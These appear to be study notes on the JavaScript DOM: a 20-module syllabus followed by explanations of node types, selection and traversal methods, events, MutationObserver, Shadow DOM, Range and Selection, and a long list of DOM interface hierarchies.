# Syllabus

## Module 1: DOM Fundamentals

- What is the DOM
- DOM tree structure
- Nodes and node types
- Document object
- Window object
- DOM vs HTML vs JavaScript relationship

## Module 2: Selecting Elements

- getElementById
- getElementsByClassName
- getElementsByTagName
- querySelector
- querySelectorAll
- Deprecated selection methods
- NodeList vs HTMLCollection
- Live vs static collections

## Module 3: Traversing the DOM

- Parent nodes (parentNode, parentElement)
- Child nodes (childNodes, children, firstChild, lastChild, firstElementChild, lastElementChild)
- Sibling nodes (nextSibling, previousSibling, nextElementSibling, previousElementSibling)
- Closest method
- Matches method
- Contains method

## Module 4: Element Properties and Attributes

- innerHTML, outerHTML, textContent, innerText
- getAttribute, setAttribute, removeAttribute, hasAttribute
- Dataset API (data-* attributes)
- Class manipulation (className, classList)
- ID and tag name properties
- Custom attributes

## Module 5: Creating and Modifying Elements

- createElement
- createTextNode
- createDocumentFragment
- cloneNode
- appendChild
- append, prepend
- insertBefore, insertAdjacentElement
- replaceChild, replaceWith
- removeChild, remove
- insertAdjacentHTML, insertAdjacentText

## Module 6: Element Styling

- Style property (inline styles)
- CSSStyleDeclaration
- getComputedStyle
- CSS class manipulation techniques
- CSS custom properties via JavaScript

## Module 7: Element Dimensions and Positioning

- offsetWidth, offsetHeight
- offsetLeft, offsetTop, offsetParent
- clientWidth, clientHeight
- clientLeft, clientTop
- scrollWidth, scrollHeight
- scrollLeft, scrollTop
- getBoundingClientRect
- Viewport dimensions

## Module 8: Event Handling

- addEventListener, removeEventListener
- Event object properties
- Event types (mouse, keyboard, form, focus, etc.)
- Event bubbling
- Event capturing
- Event delegation
- stopPropagation, preventDefault
- Event.target vs Event.currentTarget
- Custom events (CustomEvent, dispatchEvent)
- Once and passive options

## Module 9: Forms and Input Handling

- Form elements and properties
- Input validation
- FormData API
- Form submission handling
- Input events (input, change, blur, focus)
- Checkbox and radio button handling
- Select and option elements

## Module 10: Document Manipulation

- document.write (and why to avoid it)
- document.title
- document.body, document.head
- document.documentElement
- document.readyState
- DOMContentLoaded vs load events
- document.cookie basics

## Module 11: [[DOM (2 of 2)#Advanced Node Operations]]

- Node properties (nodeType, nodeName, nodeValue)
- normalize method
- Node comparison methods
- DocumentFragment usage
- Template elements
- Shadow DOM basics

## Module 12: [[DOM (2 of 2)#Performance Optimization]]

- Reflow and repaint concepts
- Batch DOM operations
- DocumentFragment for multiple insertions
- requestAnimationFrame
- Debouncing and throttling
- Virtual scrolling concepts
- DOM operation profiling

## Module 13: [[DOM (2 of 2)#Browser APIs Related to DOM]]

- MutationObserver
- IntersectionObserver
- ResizeObserver
- Scroll events and optimization
- Clipboard API
- Drag and Drop API
- History API (pushState, replaceState)
- URL and URLSearchParams

## Module 14: [[DOM (2 of 2)#HTML5 APIs]]

- LocalStorage and SessionStorage
- IndexedDB basics
- Web Workers (context of DOM restrictions)
- Canvas element manipulation
- SVG manipulation via DOM
- Audio and Video element APIs

## Module 15: [[DOM (2 of 2)#Accessibility in DOM]]

- ARIA attributes
- Role attribute
- Keyboard navigation handling
- Focus management
- Screen reader considerations
- Semantic HTML via JavaScript

## Module 16: [[DOM (2 of 2)#Security Considerations]]

- XSS prevention
- Safe HTML insertion
- Content Security Policy awareness
- Trusted Types API
- Sanitizing user input
- Safe event handling

## Module 17: [[DOM (2 of 2)#Browser Compatibility]]

- Feature detection
- Polyfills
- Vendor prefixes
- Cross-browser event handling
- Legacy IE considerations (historical context)
- Progressive enhancement

## Module 18: [[DOM (2 of 2)#Modern DOM Patterns]]

- Component-based thinking
- Virtual DOM concepts
- Declarative vs imperative approaches
- State management patterns
- Reactive updates
- Custom elements (Web Components)

## Module 19: [[DOM (2 of 2)#Testing and Debugging]]

- Browser DevTools for DOM inspection
- Console methods for DOM debugging
- Breakpoints in DOM manipulation
- Performance monitoring
- Memory leak detection
- Automated DOM testing concepts

## Module 20: [[DOM (2 of 2)#Real-World Projects]]

- Dynamic table manipulation
- Modal and overlay systems
- Infinite scroll implementation
- Drag and drop interfaces
- Form validation system
- Single-page navigation
- Dynamic content loading
- Tooltip system
- Accordion/collapse components
- Responsive menu systems

---


---

# DOM Fundamentals

## Understanding DOM Terms and Naming Patterns

### Core DOM Terminology

#### Document Object Model (DOM)
The DOM is a programming interface that represents HTML/XML documents as a tree structure where each element, attribute, and text becomes a node that can be accessed and manipulated.

#### Key Terms

**Node** - The fundamental unit in the DOM. Everything is a node: elements, text, attributes, comments.

**Element** - A specific type of node representing HTML tags (like `<div>`, `<p>`, `<span>`).

**Attribute** - Properties of elements (like `class`, `id`, `src`).

**Parent/Child/Sibling** - Relationships between nodes:
- Parent: the node containing another node
- Child: a node contained within another
- Sibling: nodes sharing the same parent

**Document** - The root object representing the entire HTML document. Accessed via `document`.

**Window** - The browser window object containing the document. The global object in browser JavaScript.

**NodeList** - A collection of nodes, similar to an array but not exactly an array. Returned by methods like `querySelectorAll()`.

**HTMLCollection** - A live collection of elements that updates automatically when the DOM changes. Returned by methods like `getElementsByClassName()`.

**Event** - An action or occurrence (click, keypress, load) that can be detected and handled.

**Event Listener** - A function that waits for and responds to specific events.

**Event Target** - The object that triggered an event.

**Event Bubbling** - When an event propagates from the target element up through its ancestors.

**Event Capturing** - When an event propagates from the root down to the target element (opposite of bubbling).

---

### DOM Naming Patterns and Standards

### Selection Methods Pattern

These follow a clear pattern based on **what** they select and **how many** they return:

**Pattern: `getElement[s]By[Criterion]()`**

- **Singular (`getElement`)** = returns ONE element (or null)
- **Plural (`getElements`)** = returns a COLLECTION

Examples:
- `getElementById()` - returns one element by ID
- `getElementsByClassName()` - returns collection by class name
- `getElementsByTagName()` - returns collection by tag name

**Pattern: `querySelector[All]()`**

- `querySelector()` - returns the FIRST matching element
- `querySelectorAll()` - returns ALL matching elements (NodeList)

**Memory aid**: "query" means search, "All" means get everything that matches.

#### Property Naming Patterns

**Pattern: `inner[Type]`**
- `innerHTML` - the HTML content inside an element
- `innerText` - the visible text inside an element
- `textContent` - all text content (including hidden)

**Pattern: `[property]Name`**
- `className` - the class attribute
- `tagName` - the tag type (DIV, P, etc.)
- `nodeName` - the name of the node

**Pattern: `[direction]Sibling` or `[direction]Child`**
- `nextSibling` / `previousSibling` - adjacent nodes
- `nextElementSibling` / `previousElementSibling` - adjacent elements only
- `firstChild` / `lastChild` - first/last child node
- `firstElementChild` / `lastElementChild` - first/last child element

**Memory aid**: "Element" in the name means it skips text nodes and only gets element nodes.

#### Manipulation Method Patterns

**Pattern: `create[Type]()`**
- `createElement()` - creates a new element node
- `createTextNode()` - creates a new text node
- `createDocumentFragment()` - creates a fragment container

**Pattern: `append[Something]()` or `[action]Child()`**
- `appendChild()` - adds a child to the end
- `removeChild()` - removes a child
- `replaceChild()` - replaces one child with another
- `insertBefore()` - inserts before a reference node

**Modern alternatives**:
- `append()` - can add multiple nodes/strings at once
- `prepend()` - adds to the beginning
- `remove()` - removes the element itself
- `replaceWith()` - replaces the element itself

**Memory aid**: Methods with "Child" require a parent context. Modern methods work on the element itself.

#### Attribute Method Patterns

**Pattern: `[action]Attribute()`**
- `getAttribute(name)` - gets an attribute value
- `setAttribute(name, value)` - sets an attribute
- `removeAttribute(name)` - removes an attribute
- `hasAttribute(name)` - checks if attribute exists

#### Class Manipulation Pattern

**Pattern: `classList.[action]()`**
- `classList.add()` - adds classes
- `classList.remove()` - removes classes
- `classList.toggle()` - adds if absent, removes if present
- `classList.contains()` - checks if class exists

**Memory aid**: "List" indicates you're working with a collection of classes.

#### Event Method Patterns

**Pattern: `[action]EventListener()`**
- `addEventListener(type, handler)` - attaches an event listener
- `removeEventListener(type, handler)` - removes an event listener

**Pattern: `on[eventtype]` (older style)**
- `onclick` - click event property
- `onload` - load event property
- `onsubmit` - submit event property

**Memory aid**: `addEventListener` is preferred because it allows multiple listeners and better control.

#### Style Property Pattern

**Pattern: camelCase for CSS properties**
- CSS: `background-color` → DOM: `backgroundColor`
- CSS: `font-size` → DOM: `fontSize`
- CSS: `z-index` → DOM: `zIndex`

**Memory aid**: Remove hyphens and capitalize the next letter.

---

### Retention Strategies

#### Mental Model: "Get, Create, Modify, Remove"

1. **Get** (Selection): `get...`, `query...`
2. **Create**: `create...`
3. **Modify**: `set...`, `append...`, `insert...`, properties
4. **Remove**: `remove...`

#### Singular vs Plural Rule

- If it says "Elements" (plural) or "All" → you get multiple items
- If it says "Element" (singular) or no qualifier → you get one item

#### Direction Words

- `next` = forward in the DOM
- `previous` = backward in the DOM 
- `first` = the beginning
- `last` = the end
- `parent` = up one level
- `child` = down one level

#### "Element" Keyword Rule

If a method/property contains "Element", it works specifically with element nodes and skips text/comment nodes. Without "Element", it works with all node types.

Examples:
- `firstChild` (any node) vs `firstElementChild` (only elements)
- `nextSibling` (any node) vs `nextElementSibling` (only elements)

This systematic understanding should help you predict method names and remember them more easily based on what you're trying to accomplish.

---

## The Document Object Model (DOM)

The DOM is a programming interface that represents HTML and XML documents as a tree structure of objects. Browsers parse markup and construct this live representation in memory, allowing scripts to access and manipulate document structure, style, and content dynamically.

### Tree Structure and Node Hierarchy

The DOM organizes documents into a hierarchical tree where every element, attribute, and text fragment becomes a node. The `document` object serves as the entry point, with `document.documentElement` representing the root `<html>` element.

**Node types** include:

- **Element nodes** (nodeType 1): HTML tags like `<div>`, `<p>`
- **Text nodes** (nodeType 3): Character data between tags
- **Attribute nodes** (deprecated in DOM4, now accessed via element properties)
- **Comment nodes** (nodeType 8): HTML comments
- **Document nodes** (nodeType 9): The document itself
- **DocumentFragment nodes** (nodeType 11): Lightweight containers for batch operations

Each node has relationships: `parentNode`, `childNodes`, `firstChild`, `lastChild`, `nextSibling`, `previousSibling`. Element nodes specifically have `children`, `firstElementChild`, `lastElementChild`, `nextElementSibling`, `previousElementSibling` that skip non-element nodes.

### DOM Interfaces and Inheritance

The DOM defines a hierarchy of interfaces that JavaScript objects implement:

```
EventTarget
  └─ Node
      ├─ Document
      ├─ Element
      │   └─ HTMLElement
      │       ├─ HTMLDivElement
      │       ├─ HTMLInputElement
      │       └─ [other HTML elements]
      ├─ Text
      ├─ Comment
      └─ DocumentFragment
```

This inheritance means a `<div>` element has properties from `HTMLDivElement`, `HTMLElement`, `Element`, `Node`, and `EventTarget`.

### Selection and Traversal

**Query methods** provide node access:

- `getElementById(id)`: Returns single element or null
- `getElementsByClassName(classNames)`: Returns live HTMLCollection
- `getElementsByTagName(tagName)`: Returns live HTMLCollection
- `querySelector(selector)`: Returns first match or null
- `querySelectorAll(selector)`: Returns static NodeList

**Live vs. static collections**: `getElementsBy*` methods return collections that automatically update when the DOM changes. `querySelectorAll` returns a static snapshot frozen at query time.

**Traversal APIs** like `TreeWalker` and `NodeIterator` enable filtered, programmatic tree navigation with custom logic for skipping nodes.

### Manipulation Operations

**Creating nodes**:

- `document.createElement(tagName)`
- `document.createTextNode(data)`
- `document.createDocumentFragment()`
- `element.cloneNode(deep)` - deep=true clones descendants

**Inserting nodes**:

- `parent.appendChild(node)` - adds to end
- `parent.insertBefore(node, referenceNode)`
- `element.append(...nodes)` - modern, accepts strings
- `element.prepend(...nodes)`
- `element.before(...nodes)`, `element.after(...nodes)`
- `element.replaceWith(...nodes)`

**Removing nodes**:

- `parent.removeChild(child)` - legacy
- `element.remove()` - modern, simpler

**Replacing content**:

- `element.innerHTML` - parses and renders HTML strings (security risk with untrusted input)
- `element.textContent` - sets text, escapes HTML
- `element.replaceChildren(...nodes)` - replaces all children atomically

### Attributes and Properties

JavaScript element properties don't always mirror HTML attributes directly. The DOM maintains two parallel systems:

**Attribute methods** (string-based):

- `element.getAttribute(name)`
- `element.setAttribute(name, value)`
- `element.hasAttribute(name)`
- `element.removeAttribute(name)`
- `element.attributes` - NamedNodeMap of all attributes

**Property access** (type-aware):

- `element.id`, `element.className`, `element.href`
- Properties can have different types (boolean for `checked`, number for `tabIndex`)
- Some properties reflect attributes (`id` ↔ `id`), others don't (`value` property vs `value` attribute)

The `class` attribute becomes `className` property due to JavaScript reserved words. `classList` provides a DOMTokenList for class manipulation: `add()`, `remove()`, `toggle()`, `contains()`, `replace()`.

### Styling Through the DOM

**Inline styles** via `element.style`:

- Sets the `style` attribute directly
- Properties are camelCased: `backgroundColor`, `fontSize`
- Values are strings: `element.style.width = '100px'`
- `cssText` sets multiple properties: `element.style.cssText = 'color: red; font-size: 16px'`

**Computed styles** via `window.getComputedStyle(element, pseudoElement)`:

- Returns read-only CSSStyleDeclaration with resolved values
- Reflects actual rendered styles including inherited and stylesheet rules
- Pseudo-element parameter optional for `::before`, `::after`, etc.

**Stylesheet manipulation**:

- `document.styleSheets` - StyleSheetList of all stylesheets
- `CSSStyleSheet.insertRule(rule, index)`, `deleteRule(index)`
- `sheet.cssRules` or `sheet.rules` - access individual rules

### Event System

The DOM event system operates in three phases:

1. **Capturing phase**: Event travels from `window` down to target
2. **Target phase**: Event reaches the target element
3. **Bubbling phase**: Event bubbles back up to `window`

**Event registration**:

- `element.addEventListener(type, listener, options)`
- Options: `capture` (bool), `once` (bool), `passive` (bool), `signal` (AbortSignal)
- `element.removeEventListener(type, listener, options)` - must match registration

*capture (boolean)* controls which phase of event propagation triggers the listener. When `true`, the listener fires during the capture phase (event travels down from root to target). When `false` (default), the listener fires during the bubble phase (event travels up from target to root). You can use `element.addEventListener('click', handler, { capture: true })` or the older boolean syntax `element.addEventListener('click', handler, true)`.

*once (boolean)* determines whether the listener persists. When `true`, the listener automatically removes itself after firing once. When `false` (default), the listener persists until explicitly removed. For example: `element.addEventListener('click', handler, { once: true })` will only fire on the first click, then remove itself.

*passive (boolean)* indicates whether the listener will call `preventDefault()`. When `true`, the listener will not call `preventDefault()`, allowing the browser to optimize scrolling performance. When `false` (default), the listener may call `preventDefault()`. For example: `element.addEventListener('touchstart', handler, { passive: true })` lets the browser optimize scroll performance since it knows `preventDefault()` won't be called. [Inference] If you set `passive: true` but try to call `preventDefault()` in the handler, the call will be ignored and the browser may log a warning.

*signal (AbortSignal)* allows you to remove the listener using an `AbortController`. You create a controller with `const controller = new AbortController()`, pass its signal when adding the listener with `element.addEventListener('click', handler, { signal: controller.signal })`, and later remove the listener by calling `controller.abort()`.

**Event object properties**:

- `event.target` - element that triggered the event
- `event.currentTarget` - element with the listener attached
- `event.type`, `event.timeStamp`
- `event.bubbles`, `event.cancelable`
- `event.preventDefault()` - prevents default action
- `event.stopPropagation()` - stops propagation to other elements
- `event.stopImmediatePropagation()` - stops other listeners on same element

**Event delegation** exploits bubbling: attach listeners to ancestor elements and check `event.target` to handle events from descendants. This reduces memory overhead and handles dynamically added elements. Event delegation reduces memory overhead because you create one listener on a parent element instead of many listeners on multiple child elements.

### DocumentFragment for Performance

`DocumentFragment` is a lightweight container that exists outside the main DOM tree. Building complex structures in a fragment and inserting once minimizes reflows:

```javascript
const fragment = document.createDocumentFragment();
for (let i = 0; i < 1000; i++) {
  const div = document.createElement('div');
  fragment.appendChild(div);
}
document.body.appendChild(fragment); // Single reflow
```

### Reflow and Repaint

**Reflow** (layout): Browser recalculates element positions and dimensions. Triggered by:

- Changing element dimensions, position, or display
- Content changes affecting layout
- Window resize
- Reading computed layout properties (`offsetHeight`, `getBoundingClientRect()`)

**Repaint**: Browser redraws pixels without layout changes. Triggered by:

- Color changes
- Visibility changes
- Background changes

[Inference] Batching DOM operations and minimizing forced synchronous layouts (reading layout properties after writes) improves performance, though exact performance impact varies by browser implementation.

### MutationObserver

`MutationObserver` asynchronously monitors DOM changes:

```javascript
const observer = new MutationObserver((mutations) => {
  mutations.forEach(mutation => {
    // Process changes
  });
});

observer.observe(targetNode, {
  childList: true,      // Child node additions/removals
  attributes: true,     // Attribute changes
  characterData: true,  // Text content changes
  subtree: true,        // Monitor descendants
  attributeOldValue: true,
  characterDataOldValue: true
});
```

Observers fire after the script completes but before rendering, consolidating multiple changes into batched callbacks.

The `observe` method attaches the observer to `targetNode` with specific configuration options. `childList: true` detects when child nodes are added or removed. `attributes: true` watches for changes to element attributes. `characterData: true` monitors modifications to text content within text nodes. `subtree: true` extends monitoring to all descendant nodes, not just direct children. `attributeOldValue: true` includes the previous attribute value in mutation records. `characterDataOldValue: true` includes the previous text content in mutation records.

This setup provides comprehensive monitoring of DOM changes, useful for scenarios like detecting dynamic content updates, implementing custom devtools, or syncing state with DOM modifications. The observer will fire the callback whenever any of the specified change types occur within the target element or its subtree.

**childList mutations** occur when elements are added or removed. Appending a new div with `parent.appendChild(document.createElement('div'))` triggers this. Removing an element with `parent.removeChild(child)` also triggers it. Replacing `innerHTML` like `parent.innerHTML = '<span>New content</span>'` triggers it because the old children are removed and new ones added.

**attributes mutations** happen when element attributes change. Setting `element.className = 'active'` triggers this. Calling `element.setAttribute('data-id', '123')` triggers it. Removing an attribute with `element.removeAttribute('disabled')` triggers it. Even style changes via `element.style.color = 'red'` trigger it since style is an attribute.

**characterData mutations** fire when text node content changes. If you have a text node reference and call `textNode.data = 'new text'`, this triggers. Changing `textContent` on an element like `element.textContent = 'updated'` may trigger this if the element contains a text node that gets modified.

**subtree monitoring** captures all the above changes in descendant elements. With `subtree: true`, modifying `grandchild.className = 'highlight'` triggers the observer even if you're observing the grandparent element.

**oldValue options** provide the previous state. If you change `element.id` from 'old' to 'new' with `attributeOldValue: true` enabled, the mutation record includes both the old value ('old') and you can check the current value ('new') from the element itself.

### Shadow DOM

Shadow DOM encapsulates subtrees with isolated styling and markup:

```javascript
const shadow = element.attachShadow({mode: 'open'});
shadow.innerHTML = '<style>p { color: red; }</style><p>Encapsulated</p>';
```

**Mode options**:

- `open`: `element.shadowRoot` accessible
- `closed`: `shadowRoot` returns null [Inference] though closure references remain accessible

Styles inside shadow roots don't leak out; external styles don't leak in. Custom elements commonly use shadow DOM for component isolation.

### Range and Selection APIs

**Range** represents document fragments:

- `document.createRange()`
- `setStart(node, offset)`, `setEnd(node, offset)`
- `selectNode(node)`, `selectNodeContents(node)`
- `deleteContents()`, `extractContents()`, `cloneContents()`

**Selection** represents user selections:

- `window.getSelection()` returns current selection
- `addRange(range)`, `removeRange(range)`, `removeAllRanges()`
- `anchorNode`, `focusNode` - selection endpoints

The **Range** object represents a fragment or portion of a document. You create one using `document.createRange()`, which gives you an object that can span across multiple nodes in the DOM tree. 

To define what portion of the document your range covers, you use `setStart(node, offset)` and `setEnd(node, offset)` - these methods let you specify exactly where the range begins and ends by pointing to a specific node and an offset within it. The offset means different things depending on the node type: for text nodes, it's the character position, while for element nodes, it's the child node index.

If you want to quickly select content without manually setting start and end points, you have two convenience methods: `selectNode(node)` sets the range to encompass that node including its boundaries (like selecting the entire `<p>` tag and its contents), while `selectNodeContents(node)` selects only the contents inside the node, excluding the node's own opening and closing tags.

Once you have a range defined, you can manipulate it in several ways. The method `deleteContents()` removes the selected content from the document permanently. The method `extractContents()` removes the content but also returns it as a document fragment you can insert elsewhere or work with further. The method `cloneContents()` creates a copy of the content as a document fragment without removing the original from the document.

---

The **Selection** object represents what the user has actually selected or highlighted in the document, which might be nothing, some text, or even multiple ranges. You access the current selection by calling `window.getSelection()`, which returns the selection object for that window.

This selection object can contain one or more Range objects representing the highlighted portions. You can programmatically modify the selection using several methods: `addRange(range)` adds a range to the current selection (though most browsers only support a single range), `removeRange(range)` removes a specific range from the selection, and `removeAllRanges()` clears the selection entirely, leaving nothing highlighted.

The selection has two important endpoint properties that you can examine. The property `anchorNode` represents the node where the user started their selection (where they first clicked or touched). The property `focusNode` represents the node where the selection currently ends (where they released or where the cursor is now). These might be the same node if nothing is selected or if the selection is within a single node, or they might be different nodes if the selection spans across multiple elements in the document.

### DOM Levels and Standards

The DOM evolved through levels:

- **DOM Level 0**: Unofficial, pre-standardization browser APIs
- **DOM Level 1** (1998): Core document structure and HTML
- **DOM Level 2** (2000): Events, CSS, traversal, views
- **DOM Level 3** (2004): XPath, keyboard events, load/save
- **DOM Level 4**: Modern living standard (no longer versioned)

The WHATWG now maintains the DOM Standard as a living specification that continuously evolves. W3C and WHATWG merged their efforts in 2019, with WHATWG as the sole maintainer.

### Virtual DOM Distinction

The browser DOM is the actual document representation. Virtual DOM is a programming pattern used by frameworks (React, Vue) where JavaScript objects mirror the DOM structure. Frameworks diff virtual trees and batch actual DOM updates. [Inference] This abstraction can improve performance for complex UIs by minimizing direct DOM manipulation, though the pattern introduces memory and computational overhead.

---

## DOM Interfaces/Classes Hierarchy Tree

### Core DOM Hierarchy

#### EventTarget
- **Node**
  - **Document**
    - HTMLDocument
    - XMLDocument
    - SVGDocument
  - **DocumentFragment**
    - ShadowRoot
  - **DocumentType**
  - **Element**
    - **HTMLElement**
      - HTMLAnchorElement (`<a>`)
      - HTMLAreaElement (`<area>`)
      - HTMLAudioElement (`<audio>`)
      - HTMLBaseElement (`<base>`)
      - HTMLBodyElement (`<body>`)
      - HTMLBRElement (`<br>`)
      - HTMLButtonElement (`<button>`)
      - HTMLCanvasElement (`<canvas>`)
      - HTMLDataElement (`<data>`)
      - HTMLDataListElement (`<datalist>`)
      - HTMLDetailsElement (`<details>`)
      - HTMLDialogElement (`<dialog>`)
      - HTMLDirectoryElement (`<dir>`) [deprecated]
      - HTMLDivElement (`<div>`)
      - HTMLDListElement (`<dl>`)
      - HTMLEmbedElement (`<embed>`)
      - HTMLFieldSetElement (`<fieldset>`)
      - HTMLFontElement (`<font>`) [deprecated]
      - HTMLFormElement (`<form>`)
      - HTMLFrameElement (`<frame>`) [deprecated]
      - HTMLFrameSetElement (`<frameset>`) [deprecated]
      - HTMLHeadElement (`<head>`)
      - HTMLHeadingElement (`<h1>`-`<h6>`)
      - HTMLHRElement (`<hr>`)
      - HTMLHtmlElement (`<html>`)
      - HTMLIFrameElement (`<iframe>`)
      - HTMLImageElement (`<img>`)
      - HTMLInputElement (`<input>`)
      - HTMLLabelElement (`<label>`)
      - HTMLLegendElement (`<legend>`)
      - HTMLLIElement (`<li>`)
      - HTMLLinkElement (`<link>`)
      - HTMLMapElement (`<map>`)
      - HTMLMarqueeElement (`<marquee>`) [deprecated]
      - HTMLMediaElement
        - HTMLAudioElement (`<audio>`)
        - HTMLVideoElement (`<video>`)
      - HTMLMenuElement (`<menu>`)
      - HTMLMetaElement (`<meta>`)
      - HTMLMeterElement (`<meter>`)
      - HTMLModElement (`<ins>`, `<del>`)
      - HTMLObjectElement (`<object>`)
      - HTMLOListElement (`<ol>`)
      - HTMLOptGroupElement (`<optgroup>`)
      - HTMLOptionElement (`<option>`)
      - HTMLOutputElement (`<output>`)
      - HTMLParagraphElement (`<p>`)
      - HTMLParamElement (`<param>`) [deprecated]
      - HTMLPictureElement (`<picture>`)
      - HTMLPreElement (`<pre>`)
      - HTMLProgressElement (`<progress>`)
      - HTMLQuoteElement (`<blockquote>`, `<q>`)
      - HTMLScriptElement (`<script>`)
      - HTMLSelectElement (`<select>`)
      - HTMLSlotElement (`<slot>`)
      - HTMLSourceElement (`<source>`)
      - HTMLSpanElement (`<span>`)
      - HTMLStyleElement (`<style>`)
      - HTMLTableCaptionElement (`<caption>`)
      - HTMLTableCellElement (`<td>`, `<th>`)
      - HTMLTableColElement (`<col>`, `<colgroup>`)
      - HTMLTableElement (`<table>`)
      - HTMLTableRowElement (`<tr>`)
      - HTMLTableSectionElement (`<thead>`, `<tbody>`, `<tfoot>`)
      - HTMLTemplateElement (`<template>`)
      - HTMLTextAreaElement (`<textarea>`)
      - HTMLTimeElement (`<time>`)
      - HTMLTitleElement (`<title>`)
      - HTMLTrackElement (`<track>`)
      - HTMLUListElement (`<ul>`)
      - HTMLUnknownElement (unknown tags)
      - HTMLVideoElement (`<video>`)
    - **SVGElement**
      - SVGGraphicsElement
        - SVGGeometryElement
          - SVGCircleElement (`<circle>`)
          - SVGEllipseElement (`<ellipse>`)
          - SVGLineElement (`<line>`)
          - SVGPathElement (`<path>`)
          - SVGPolygonElement (`<polygon>`)
          - SVGPolylineElement (`<polyline>`)
          - SVGRectElement (`<rect>`)
        - SVGTextContentElement
          - SVGTextPositioningElement
            - SVGTextElement (`<text>`)
            - SVGTSpanElement (`<tspan>`)
            - SVGTextPathElement (`<textPath>`)
        - SVGGElement (`<g>`)
        - SVGUseElement (`<use>`)
        - SVGImageElement (`<image>`)
        - SVGSVGElement (`<svg>`)
        - SVGForeignObjectElement (`<foreignObject>`)
      - SVGAnimationElement
        - SVGAnimateElement (`<animate>`)
        - SVGAnimateMotionElement (`<animateMotion>`)
        - SVGAnimateTransformElement (`<animateTransform>`)
        - SVGSetElement (`<set>`)
      - SVGClipPathElement (`<clipPath>`)
      - SVGDefsElement (`<defs>`)
      - SVGDescElement (`<desc>`)
      - SVGFilterElement (`<filter>`)
      - SVGGradientElement
        - SVGLinearGradientElement (`<linearGradient>`)
        - SVGRadialGradientElement (`<radialGradient>`)
      - SVGMarkerElement (`<marker>`)
      - SVGMaskElement (`<mask>`)
      - SVGMetadataElement (`<metadata>`)
      - SVGPatternElement (`<pattern>`)
      - SVGScriptElement (`<script>`)
      - SVGStopElement (`<stop>`)
      - SVGStyleElement (`<style>`)
      - SVGSymbolElement (`<symbol>`)
      - SVGTitleElement (`<title>`)
      - SVGViewElement (`<view>`)
      - SVGComponentTransferFunctionElement
        - SVGFEFuncAElement
        - SVGFEFuncBElement
        - SVGFEFuncGElement
        - SVGFEFuncRElement
      - SVGFEBlendElement (`<feBlend>`)
      - SVGFEColorMatrixElement (`<feColorMatrix>`)
      - SVGFEComponentTransferElement (`<feComponentTransfer>`)
      - SVGFECompositeElement (`<feComposite>`)
      - SVGFEConvolveMatrixElement (`<feConvolveMatrix>`)
      - SVGFEDiffuseLightingElement (`<feDiffuseLighting>`)
      - SVGFEDisplacementMapElement (`<feDisplacementMap>`)
      - SVGFEDistantLightElement (`<feDistantLight>`)
      - SVGFEDropShadowElement (`<feDropShadow>`)
      - SVGFEFloodElement (`<feFlood>`)
      - SVGFEGaussianBlurElement (`<feGaussianBlur>`)
      - SVGFEImageElement (`<feImage>`)
      - SVGFEMergeElement (`<femerge>`)
      - SVGFEMergeNodeElement (`<feMergeNode>`)
      - SVGFEMorphologyElement (`<feMorphology>`)
      - SVGFEOffsetElement (`<feOffset>`)
      - SVGFEPointLightElement (`<fePointLight>`)
      - SVGFESpecularLightingElement (`<feSpecularLighting>`)
      - SVGFESpotLightElement (`<feSpotLight>`)
      - SVGFETileElement (`<feTile>`)
      - SVGFETurbulenceElement (`<feTurbulence>`)
    - **MathMLElement** (MathML elements)
  - **Attr** (attribute nodes)
  - **CharacterData**
    - **Text**
      - CDATASection
    - **Comment**
    - ProcessingInstruction
- **Window**
- **XMLHttpRequest**
- **FileReader**
- **MessagePort**
- **AudioNode** (Web Audio API)
- **IDBRequest** (IndexedDB)
- **Performance**
- **Animation** (Web Animations API)
- **AbortSignal**
- **BroadcastChannel**
- **MediaStream**
- **RTCPeerConnection**
- **WebSocket**
- **Worker**
  - SharedWorker
  - ServiceWorker

### Collection Interfaces

- **NodeList**
  - StaticNodeList
  - LiveNodeList
- **HTMLCollection** (live collection)
- **DOMTokenList** (classList, relList)
- **NamedNodeMap** (attributes)
- **DOMStringList**
- **RadioNodeList**
- **HTMLFormControlsCollection**
- **HTMLOptionsCollection**

### DOM Data Structures

- **DOMRect**
  - DOMRectReadOnly
- **DOMRectList**
- **DOMPoint**
  - DOMPointReadOnly
- **DOMMatrix**
  - DOMMatrixReadOnly
- **DOMQuad**
- **DOMStringMap** (dataset)
- **CSSStyleDeclaration**
- **StyleSheet**
  - CSSStyleSheet
- **StyleSheetList**
- **CSSRuleList**
- **CSSRule**
  - CSSStyleRule
  - CSSMediaRule
  - CSSImportRule
  - CSSFontFaceRule
  - CSSKeyframesRule
  - CSSKeyframeRule
  - CSSSupportsRule
  - CSSNamespaceRule
  - CSSPageRule

### Range and Selection

- **Range**
- **Selection**
- **StaticRange**

### Mutation and Observation

- **MutationObserver**
- **MutationRecord**
- **IntersectionObserver**
- **IntersectionObserverEntry**
- **ResizeObserver**
- **ResizeObserverEntry**
- **PerformanceObserver**

### Events Hierarchy

- **Event**
  - **UIEvent**
    - **MouseEvent**
      - DragEvent
      - PointerEvent
      - WheelEvent
    - **FocusEvent**
    - **KeyboardEvent**
    - **InputEvent**
    - **CompositionEvent**
    - **TouchEvent**
  - **CustomEvent**
  - **AnimationEvent**
  - **TransitionEvent**
  - **ClipboardEvent**
  - **MessageEvent**
  - **StorageEvent**
  - **PopStateEvent**
  - **HashChangeEvent**
  - **PageTransitionEvent**
  - **ProgressEvent**
  - **ErrorEvent**
  - **PromiseRejectionEvent**
  - **SecurityPolicyViolationEvent**
  - **SubmitEvent**
  - **FormDataEvent**
  - **BeforeUnloadEvent**

### Media and Graphics

- **CanvasRenderingContext2D**
- **WebGLRenderingContext**
  - WebGL2RenderingContext
- **ImageData**
- **ImageBitmap**
- **Path2D**
- **TextMetrics**
- **CanvasGradient**
- **CanvasPattern**

### File and Blob APIs

- **Blob**
  - File
- **FileList**
- **FileReader**
- **FormData**
- **DataTransfer**
- **DataTransferItem**
- **DataTransferItemList**

### URL and History

- **URL**
- **URLSearchParams**
- **Location**
- **History**

### Storage

- **Storage** (localStorage, sessionStorage)
- **StorageManager**

### Web Components

- **CustomElementRegistry**
- **ShadowRoot** (extends DocumentFragment)

### Miscellaneous

- **DOMParser**
- **XMLSerializer**
- **DOMImplementation**
- **NodeIterator**
- **TreeWalker**
- **ValidityState**
- **TimeRanges**
- **TextTrack**
- **TextTrackCue**
- **TextTrackList**
- **TextTrackCueList**
- **MediaError**
- **MediaQueryList**
- **Screen**
- **Navigator**
- **Plugin**
- **PluginArray**
- **MimeType**
- **MimeTypeArray**
- **Crypto**
- **SubtleCrypto**

### Abstract Interfaces (not directly instantiated)

- **NonElementParentNode** (mixin)
- **ParentNode** (mixin)
- **ChildNode** (mixin)
